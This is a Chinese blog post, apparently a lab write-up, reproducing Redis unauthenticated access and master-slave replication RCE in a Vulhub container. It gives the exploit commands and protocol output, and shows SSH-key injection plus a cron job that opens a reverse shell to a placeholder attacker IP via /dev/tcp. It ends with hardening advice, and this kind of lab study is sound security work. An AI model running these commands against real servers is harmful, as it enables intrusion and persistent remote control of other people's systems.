---
title: Redis 未授权访问漏洞复现（Vulhub 靶场）
date: 2026-06-08 09:51:00
categories:
    - 漏洞复现
    - Redis
tags: Redis 漏洞
---

## 前言

Redis 是著名的开源 Key-Value 数据库，广泛用于缓存和消息队列。本文复现了 Redis 未授权访问漏洞，并演示了通过主从复制实现 RCE（远程命令执行）的完整攻击链。

<!--more-->

## 漏洞概述

**漏洞名称：** Redis 未授权访问 + 主从复制 RCE

**影响版本：** Redis 4.x / 5.x（<= 5.0.5）

**漏洞危害：** 攻击者无需任何认证，可直接连接 Redis 并执行任意命令，最终获取服务器权限。

**根本原因：** Redis 默认配置绑定 `0.0.0.0:6379`，且默认无密码认证。

## 环境搭建

### 前置条件

- 已安装 Docker Desktop
- 已安装 Git

### 拉取靶场

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/redis/4-unacc
```

### 启动靶场

```bash
docker compose up -d
```

启动后验证：

```bash
docker ps --filter "ancestor=vulhub/redis:4.0.14"
```

输出如下，说明 Redis 4.0.14 已在 `0.0.0.0:6379` 运行：

```
CONTAINER ID   PORTS                                         STATUS
ea206bafa3df   0.0.0.0:6379->6379/tcp, [::]:6379->6379/tcp   Up 6 seconds
```

> 注意：Redis 是 TCP 服务，不能用浏览器访问，需要用 `redis-cli` 连接。

## 漏洞验证：未授权访问

使用 redis-cli 连接目标：

```bash
docker exec -it 4-unacc-redis-1 redis-cli -h 127.0.0.1 -p 6379
```

无需任何密码，直接执行命令：

```
127.0.0.1:6379> INFO server
# Server
redis_version:4.0.14
os:Linux 6.6.114.1-microsoft-standard-WSL2 x86_64
tcp_port:6379
...
```

```
127.0.0.1:6379> CONFIG GET *
```

可查看所有配置项，包括数据目录、备份文件名等敏感信息。

**结论：** 存在未授权访问漏洞，攻击者可直接操作数据库。

## 漏洞利用：主从复制 RCE

### 原理

Redis 4.x 引入了模块（Module）机制，可以通过 `MODULE LOAD` 加载外部 `.so` 动态链接库扩展功能。结合主从复制（Master-Slave Replication）机制，攻击者可以：

1. 搭建恶意 Rogue Redis 服务端
2. 通过 `SLAVEOF` 让目标 Redis 成为从节点
3. 利用全量同步推送恶意 `.so` 文件到目标
4. 加载模块后执行 `system.exec` 任意命令

### 攻击流程图

```
攻击者                          目标 Redis (4.0.14)
  │                                  │
  ├─ 1. 启动恶意 Rogue Server ──────►│
  │   (监听 8888 端口)               │
  │                                  │
  ├─ 2. SLAVEOF 攻击者IP 8888 ──────►│
  │   让目标变成从节点               │
  │                                  │
  ├─ 3. 推送恶意 exp.so ───────────►│
  │   (通过主从同步)                 │
  │                                  │
  ├─ 4. MODULE LOAD ./exp.so ──────►│
  │   加载恶意模块                   │
  │                                  │
  ├─ 5. system.exec "id" ──────────►│
  │   执行任意命令                   │
  │                                  │
  ├─ 6. MODULE UNLOAD + 恢复配置 ──►│
  │   清理痕迹                       │
```

### 准备 POC 工具

```bash
git clone https://github.com/vulhub/redis-rogue-getshell.git
cd redis-rogue-getshell/RedisModulesSDK
make
```

> Windows 用户可使用 Docker 编译：
> ```bash
> docker run --rm -v $(pwd):/src -w /src ubuntu:22.04 bash -c "apt-get update -qq && apt-get install -y -qq gcc make > /dev/null 2>&1 && make"
> ```

编译成功后会在 `RedisModulesSDK/exp` 目录生成 `exp.so`。

### 执行攻击

```bash
cd redis-rogue-getshell
python redis-master.py -r 127.0.0.1 -p 6379 -L <本机IP> -P 8888 -f RedisModulesSDK/exp.so -c "id"
```

**参数说明：**

| 参数 | 说明 |
|------|------|
| `-r` | 目标 Redis IP |
| `-p` | 目标 Redis 端口 |
| `-L` | 攻击者（Rogue Server）IP |
| `-P` | Rogue Server 监听端口 |
| `-f` | 恶意模块路径 |
| `-c` | 要执行的命令 |

### 攻击结果

```
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.67.225\r\n$4\r\n8888\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'+OK\r\n'
>> receive data: b'PING\r\n'
>> receive data: b'REPLCONF listening-port 6379\r\n'
>> receive data: b'REPLCONF capa eof capa psync2\r\n'
>> receive data: b'PSYNC cd142a99a7a88a4a9c5d5764a65536e246fca92c 1\r\n'
>> send data: b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n'
>> receive data: b'$48\r\nuid=999(redis) gid=999(redis) groups=999(redis)\n\r\n'
uid=999(redis) gid=999(redis) groups=999(redis)
```

成功执行 `id` 命令，当前用户为 `redis`（uid=999）。

> 可将 `-c` 参数替换为其他命令，如 `whoami`、`cat /etc/passwd`，甚至反弹 shell。

## 其他利用方式

除了主从复制 RCE，Redis 未授权访问还有以下利用手法：

### 写 SSH 公钥

```bash
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAA...你的公钥...\n\n"
SAVE
```

之后直接 `ssh root@目标IP` 免密登录。

### 写定时任务反弹 Shell

```bash
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/你的IP/端口 0>&1\n\n"
SAVE
```

等一分钟即可收到反弹 shell。

## 防御措施

1. **设置密码认证** — 在 `redis.conf` 中配置 `requirepass`
2. **绑定地址** — 仅绑定 `127.0.0.1`，不对外网开放
3. **修改默认端口** — 将 6379 改为其他端口
4. **防火墙限制** — 仅允许可信 IP 访问 Redis 端口
5. **以低权限运行** — 不要以 root 身份运行 Redis
6. **禁用危险命令** — 通过 `rename-command` 禁用 `CONFIG`、`SLAVEOF` 等

## 总结

Redis 未授权访问是内网渗透中非常高频的漏洞，从信息泄露到 RCE 攻击链完整。在实战中，如果内网 Redis 没有设置密码，基本等于送 shell。防御的关键在于：**设密码 + 绑地址 + 限访问**。

---

**参考资料：**
- [Vulhub Redis 靶场](https://github.com/vulhub/vulhub/tree/master/redis/4-unacc)
- [Redis Rogue Getshell POC](https://github.com/vulhub/redis-rogue-getshell)